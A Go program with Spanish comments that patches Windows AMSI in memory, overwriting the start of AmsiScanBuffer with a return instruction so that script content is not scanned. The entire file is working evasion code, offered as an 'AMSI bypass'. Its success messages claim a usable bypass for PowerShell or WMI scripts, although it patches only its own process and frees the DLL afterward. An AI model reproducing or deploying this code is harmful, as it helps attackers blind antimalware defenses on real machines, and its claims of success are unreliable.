package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func patchAMSI() error {
	// Cargar amsi.dll dinámicamente
	amsi, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to load amsi.dll: %v", err)
	}
	defer syscall.FreeLibrary(amsi)

	// Obtener la dirección de AmsiScanBuffer
	scanBufferAddr, err := syscall.GetProcAddress(amsi, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to get AmsiScanBuffer address: %v", err)
	}

	// Parche: reemplazar con ret (0xc3)
	patch := []byte{0xc3}

	// Obtener el handle del proceso actual
	var hProcess windows.Handle
	hProcess, err = windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, false, windows.GetCurrentProcessId())
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// Cambiar permisos de memoria
	var oldProtect uint32
	var size uintptr = 1
	err = windows.VirtualProtectEx(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		size,
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Escribir el parche
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		&patch[0],
		size,
		&bytesWritten,
	)
	if err != nil {
		return fmt.Errorf("failed to write memory: %v", err)
	}

	// Restaurar permisos originales
	err = windows.VirtualProtectEx(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		size,
		oldProtect,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection: %v", err)
	}

	fmt.Println("[+] AMSI patched: AmsiScanBuffer replaced with ret")
	return nil
}

func main() {
	if err := patchAMSI(); err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("AMSI bypass successful. Test with PowerShell or WMI scripts.")
	}
}
